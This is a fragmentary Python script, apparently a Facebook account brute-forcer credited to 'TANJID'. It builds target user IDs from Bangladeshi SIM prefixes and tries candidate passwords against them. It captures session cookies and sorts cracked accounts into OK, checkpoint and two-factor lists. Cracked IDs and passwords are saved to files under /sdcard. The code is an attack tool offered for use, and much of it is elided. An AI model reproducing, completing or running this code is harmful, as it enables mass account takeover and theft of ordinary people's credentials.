...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; TANJID \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
TANJID2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE  BAIMAN CYBER ")
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) TANJID
...
def XYZ():
    ...
    if TANJID in ["1","01"]:
        ...
        os.system("xdg-open https://wa.me/+8801884153077")
        XYZ()
    elif TANJID in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] BD SIM CODES : {Y}017, 018, 019, 016')
    
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 017 / 018 / 019 / 016 /033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/TANJID-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/TANJID-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio TANJID_OK.mp3")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio TANJID_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/TANJID-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio TANJID_CP.mp3")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[TANJID 🔥] [%s] \33[1;97m[OK:%s{TANJID2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
